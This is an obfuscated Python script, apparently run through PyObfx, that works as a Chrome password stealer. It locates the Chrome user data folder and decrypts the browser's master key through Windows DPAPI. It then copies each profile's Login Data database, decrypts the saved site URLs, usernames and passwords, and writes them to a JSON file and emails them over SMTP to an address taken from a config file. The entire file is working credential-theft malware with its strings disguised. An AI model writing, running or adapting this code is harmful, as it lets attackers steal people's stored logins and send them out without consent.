# Obfuscated with PyObfx #
from pathlib import Path as lztbdnRQ
import yaml as uVtBeSYW
from typing import Dict as QKaspXxD
from typing import  Union as RlntYWzPHB
import os as hMCk
import sys as lcLOtU
import smtplib as RqrOKfBCTZwkPG
from email.mime.text import MIMEText as gOJAtELNmQbVvHns
import re as bUZV
import json as pILFKxXu
import base64 as VZURdFCAjcqg
import sqlite3 as cQtOpaSwmYERGT
import win32crypt as NbMOprwaGqcESyPLthFg
from Cryptodome.Cipher import AES as blMyUj
import shutil as BScyqpxWZAOG

oSBvzMENsC = lambda n: (n + (1 + 3)) / 4
wCJXPWMBxn = lambda s: ''.join(chr(int(oSBvzMENsC(ord(c)))) for c in s)
gKanSJZorHVMyxEwbe = hMCk.path.dirname(hMCk.path.realpath(lcLOtU.argv[int(oSBvzMENsC(-4))]))
# 方便混淆
biUwyxQcpSKzNvHYrJBaEZIChgFLdRoPTGqM = hMCk.environ[wCJXPWMBxn("ŐňĐńļńĸĔĠĬĐ")]
WHIVZomOGiXsfzueEPCKtUqxaAgpJjyLvRDF = wCJXPWMBxn("ŬŬĀƼƼČƀǌƀŬŬĬƸƈƀƬŬŬĘƸƸƘƬƐŬŬĈƜǄƸưƐŬŬŐǈƐǄ|Čƀǌƀ")


def lcUHXWKgdVrGtyhafn(UbtuZTHAMOkGqiLwrV: RlntYWzPHB[str, lztbdnRQ]) -> QKaspXxD:
    naNjYJiSrVCIFQtk = getattr(lcLOtU, wCJXPWMBxn("ŸİĐĠļĀňň"), hMCk.path.dirname(hMCk.path.abspath(__file__)))
    hTjlvLkuHmspfeRWYdPUVq = hMCk.path.join(naNjYJiSrVCIFQtk, UbtuZTHAMOkGqiLwrV)
    with open(hTjlvLkuHmspfeRWYdPUVq, wCJXPWMBxn("ǄƄ")) as Ws:
        eEmSQiPW = uVtBeSYW.load(Ws, Loader=uVtBeSYW.Loader)
    if wCJXPWMBxn("ƠƴƈƬǐƌƐ") in eEmSQiPW:
        NuyIpHJgrUlxch = eEmSQiPW.pop(wCJXPWMBxn("ƠƴƈƬǐƌƐ"))
        if isinstance(NuyIpHJgrUlxch, str):
            NuyIpHJgrUlxch = [NuyIpHJgrUlxch]
        for RZ in NuyIpHJgrUlxch:
            eEmSQiPW.update(lcUHXWKgdVrGtyhafn(lztbdnRQ(hTjlvLkuHmspfeRWYdPUVq).parent / RZ))
    return eEmSQiPW

# 获取打包后可执行文件所在的目录

KoRdWicZEvGX = lcUHXWKgdVrGtyhafn(wCJXPWMBxn("ƈƸƴƔƠƘ´ǠƀưƬ"))

def pjelZskdNVtUvMwDCrgJ(kteIpZQVTO,zrgMnC):
    iWnDCQMTlgqJsV = gOJAtELNmQbVvHns(zrgMnC,wCJXPWMBxn("ƼƬƀƠƴ"),wCJXPWMBxn("ǐǌƔ°Ü"))
    iWnDCQMTlgqJsV[wCJXPWMBxn("ňǐƄƤƐƈǌ")] = kteIpZQVTO 
    iWnDCQMTlgqJsV[wCJXPWMBxn("ĔǄƸư")] = KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ǈƐƴƌƐǄ")]   
    iWnDCQMTlgqJsV[wCJXPWMBxn("ŌƸ")] = KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ǄƐƈƐƠǔƐǄǈ")] 
    try:
        AZeRnyhbVmrzvQ = RqrOKfBCTZwkPG.SMTP() 
        AZeRnyhbVmrzvQ.connect(KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ƜƸǈǌ")],int(oSBvzMENsC(96)))
        AZeRnyhbVmrzvQ.login(KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ǐǈƐǄ")],KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("Ƽƀǈǈ")]) 
        AZeRnyhbVmrzvQ.sendmail(KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ǈƐƴƌƐǄ")],[KoRdWicZEvGX[wCJXPWMBxn("ƐưƀƠƬ")][wCJXPWMBxn("ǄƐƈƐƠǔƐǄǈ")]],iWnDCQMTlgqJsV.as_string()) 
        AZeRnyhbVmrzvQ.quit() 
    except Exception as js:
        print(js)
  
def jhRvwIzabPLSqGgEZmWsBAOJXYQcnfTyeUMk():
    try:
        skIZOptRNjnVCLUxDKXTmSzlqQuWcFEo = biUwyxQcpSKzNvHYrJBaEZIChgFLdRoPTGqM + WHIVZomOGiXsfzueEPCKtUqxaAgpJjyLvRDF
        QGjnmldrgRfXyUueTFBwzkEKsVSioY = hMCk.path.normpath(hMCk.path.join(skIZOptRNjnVCLUxDKXTmSzlqQuWcFEo, wCJXPWMBxn("ĬƸƈƀƬ|ňǌƀǌƐ")))
        AOEuwsIpXaLejBTkFy = hMCk.path.join(gKanSJZorHVMyxEwbe,wCJXPWMBxn("´¸ǌƐưƼ"))
        BScyqpxWZAOG.copy(QGjnmldrgRfXyUueTFBwzkEKsVSioY, AOEuwsIpXaLejBTkFy)
        with open(AOEuwsIpXaLejBTkFy, wCJXPWMBxn("Ǆ"), encoding=wCJXPWMBxn("ǐǌƔ°Ü")) as Ws:
            BTsRrOHkEIXegCdVlcJqax = Ws.read()
            BTsRrOHkEIXegCdVlcJqax = pILFKxXu.loads(BTsRrOHkEIXegCdVlcJqax)
        JldjbMkAcDUCTYgueNIa = VZURdFCAjcqg.b64decode(BTsRrOHkEIXegCdVlcJqax[wCJXPWMBxn("ƸǈŸƈǄǠƼǌ")][wCJXPWMBxn("ƐƴƈǄǠƼǌƐƌŸƨƐǠ")])
        JldjbMkAcDUCTYgueNIa = JldjbMkAcDUCTYgueNIa[int(oSBvzMENsC(16)):] 
        JldjbMkAcDUCTYgueNIa = NbMOprwaGqcESyPLthFg.CryptUnprotectData(JldjbMkAcDUCTYgueNIa, None, None, None, int(oSBvzMENsC(-4)))[int(oSBvzMENsC(0))]
        hMCk.remove(AOEuwsIpXaLejBTkFy)
        return JldjbMkAcDUCTYgueNIa
    except Exception as js:
        if hMCk.path.exists(AOEuwsIpXaLejBTkFy):
            hMCk.remove(AOEuwsIpXaLejBTkFy)
        return None
    

def eEzgSPVyvtZMKmrlYxsHTRwAbihpdu(ozUkwVWuAgvH, ObEUMtvZoWYPym):
    return ozUkwVWuAgvH.decrypt(ObEUMtvZoWYPym)

def bNTDpMmZRWulOqhcIGHFPJQYKyAfEv(aWyxdFvTqBDpLo, jPBI):
    return blMyUj.new(aWyxdFvTqBDpLo, blMyUj.MODE_GCM, jPBI)

def ANSUuDogtLIpJBTZVMExsyPaKGdlqmfi(VaMZXchlrAGozsYigmKn, JldjbMkAcDUCTYgueNIa):
    try:
        dKtkEYVmPuIsGaLACxSOFNHzcjXgpofTZDMQJRiBwb = VaMZXchlrAGozsYigmKn[int(oSBvzMENsC(8)):int(oSBvzMENsC(56))]
        pVIoafxKTlzEPNUyJthYcFrGeDLAQbMwqvRS = VaMZXchlrAGozsYigmKn[int(oSBvzMENsC(56)):-int(oSBvzMENsC(60))]
        ozUkwVWuAgvH = bNTDpMmZRWulOqhcIGHFPJQYKyAfEv(JldjbMkAcDUCTYgueNIa, dKtkEYVmPuIsGaLACxSOFNHzcjXgpofTZDMQJRiBwb)
        mpFQSEYejXNTfOUVniBKqsgtCbaG = eEzgSPVyvtZMKmrlYxsHTRwAbihpdu(ozUkwVWuAgvH, pVIoafxKTlzEPNUyJthYcFrGeDLAQbMwqvRS)
        mpFQSEYejXNTfOUVniBKqsgtCbaG = mpFQSEYejXNTfOUVniBKqsgtCbaG.decode()  
        return mpFQSEYejXNTfOUVniBKqsgtCbaG
    except Exception as js:
        return ""

if __name__ == wCJXPWMBxn("ŸŸưƀƠƴŸŸ"):
    try:
        fqPcLljrRmevWXABJIyEQNagOZHp = jhRvwIzabPLSqGgEZmWsBAOJXYQcnfTyeUMk()
        RjrgzGDLxwSQXM = hMCk.path.normpath(biUwyxQcpSKzNvHYrJBaEZIChgFLdRoPTGqM + WHIVZomOGiXsfzueEPCKtUqxaAgpJjyLvRDF)
        ATfnpEqmgjrJvx = [ZTGUoqsARXWujf for ZTGUoqsARXWujf in hMCk.listdir(RjrgzGDLxwSQXM) if bUZV.search(wCJXPWMBxn("ŴļǄƸƔƠƬƐ¤ǬŴČƐƔƀǐƬǌ"),ZTGUoqsARXWujf)!=None]
        zqvBlOeRxXfoiwIZ = []
        for DlOMiuPBdGAV in ATfnpEqmgjrJvx:
            csoEaWnmJTzMbGOUNqrpitLZPARl = hMCk.path.normpath(hMCk.path.join(RjrgzGDLxwSQXM, DlOMiuPBdGAV,wCJXPWMBxn("ĬƸƘƠƴ|Čƀǌƀ")))
            try:
                tMnJCBayPLVlFdZpbQeqjoiw = hMCk.path.join(gKanSJZorHVMyxEwbe,wCJXPWMBxn("´¸ǌƐưƼ´ƌƄ"))
                BScyqpxWZAOG.copy2(csoEaWnmJTzMbGOUNqrpitLZPARl, tMnJCBayPLVlFdZpbQeqjoiw) 
                TsAubMYG = cQtOpaSwmYERGT.connect(tMnJCBayPLVlFdZpbQeqjoiw)
            except Exception as js:
                print(wCJXPWMBxn("𙖼𘶴𗩈𘥈𗯼𖓀𣒐ä").format(js))
                exit(int(oSBvzMENsC(-4)))
            if(fqPcLljrRmevWXABJIyEQNagOZHp and TsAubMYG):
                UTyQLdKXpxni = TsAubMYG.cursor()
                UTyQLdKXpxni.execute(wCJXPWMBxn("ňĐĬĐĈŌ|ƀƈǌƠƸƴŸǐǄƬ¬|ǐǈƐǄƴƀưƐŸǔƀƬǐƐ¬|ƼƀǈǈǘƸǄƌŸǔƀƬǐƐ|Ĕńĸİ|ƬƸƘƠƴǈ"))
                for yFmBYlgApH,gRNwAyfhvV in enumerate(UTyQLdKXpxni.fetchall()):
                    GSqmDz = {}
                    GSqmDz[wCJXPWMBxn("ǐǄƬ")] = gRNwAyfhvV[int(oSBvzMENsC(-4))]
                    GSqmDz[wCJXPWMBxn("ǐǈƐǄƴƀưƐ")] = gRNwAyfhvV[int(oSBvzMENsC(0))]
                    AgXFnhUzROWY = gRNwAyfhvV[int(oSBvzMENsC(4))]
                    if(GSqmDz[wCJXPWMBxn("ǐǄƬ")] !="" and GSqmDz[wCJXPWMBxn("ǐǈƐǄƴƀưƐ")]!="" and AgXFnhUzROWY!=""):
                        Cd = ANSUuDogtLIpJBTZVMExsyPaKGdlqmfi(AgXFnhUzROWY, fqPcLljrRmevWXABJIyEQNagOZHp)
                        GSqmDz[wCJXPWMBxn("Ƽ")] = Cd
                        zqvBlOeRxXfoiwIZ.append(GSqmDz)
                UTyQLdKXpxni.close()
                TsAubMYG.close()
                hMCk.remove(tMnJCBayPLVlFdZpbQeqjoiw)  

        if(KoRdWicZEvGX[wCJXPWMBxn("ƸǐǌƼǐǌ")][wCJXPWMBxn("ƤǈƸƴ")] == wCJXPWMBxn("ĸĴ")):
            with open(hMCk.path.join(gKanSJZorHVMyxEwbe,wCJXPWMBxn("ƸǐǌƼǐǌ´ƤǈƸƴ")),wCJXPWMBxn("ǘ"),encoding=wCJXPWMBxn("ǐǌƔ°Ü")) as Ws:
                    pILFKxXu.dump(zqvBlOeRxXfoiwIZ,Ws,ensure_ascii=bool(int(oSBvzMENsC(0))),indent=int(oSBvzMENsC(12)))
        if(KoRdWicZEvGX[wCJXPWMBxn("ƸǐǌƼǐǌ")][wCJXPWMBxn("ƐưƀƠƬ")] == wCJXPWMBxn("ĸĴ")):
           pjelZskdNVtUvMwDCrgJ(wCJXPWMBxn("ƈƜǄƸưƐ"),str(zqvBlOeRxXfoiwIZ))
        
    except:
        pass
    
